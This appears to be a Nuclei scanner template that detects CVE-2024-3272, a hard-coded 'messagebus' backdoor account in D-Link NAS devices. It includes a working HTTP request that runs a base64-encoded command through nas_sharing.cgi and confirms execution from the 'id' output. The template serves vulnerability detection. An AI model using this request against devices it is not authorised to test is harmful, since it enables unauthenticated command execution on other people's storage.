id: CVE-2024-3272

info:
  name: D-Link Network Attached Storage - Backdoor Account
  author: ritikchaddha
  severity: critical
  description: |
    A vulnerability, which was classified as very critical, has been found in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to 20240403. This issue affects some unknown processing of the file /cgi-bin/nas_sharing.cgi of the component HTTP GET Request Handler. The manipulation of the argument user with the input messagebus leads to hard-coded credentials.
  impact: |
    Attackers can use hardcoded credentials to gain unauthorized access to D-Link NAS devices and execute commands.
  remediation: |
    Update D-Link NAS firmware to a version that removes the backdoor account.
  reference:
    - https://github.com/netsecfish/dlink
    - https://nvd.nist.gov/vuln/detail/cve-2024-3272
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-3272
    cwe-id: CWE-77
    cpe: cpe:2.3:o:dlink:dns-320l_firmware:-:*:*:*:*:*:*:*
    epss-score: 0.94168
    epss-percentile: 0.99912
  metadata:
    verified: true
    max-request: 1
    vendor: dlink
    product: "dns-320l_firmware"
    fofa-query: app="D_Link-DNS-ShareCenter"
  tags: cve,cve2024,dlink,nas,kev,vkev,vuln

http:
  - raw:
      - |+
        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
        Host: {{Hostname}}

    unsafe: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<auth_state>1</auth_state>"

      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022010ebc5cdb942bf435bd31dcf3ba248e41faf3fef3155c7570f76789db932892e022100c29bc93904112844deded46fc28dfc3e9eb0a11115e22eb77655ffb14b6e7653:922c64590222798bb761d5b6d8e72950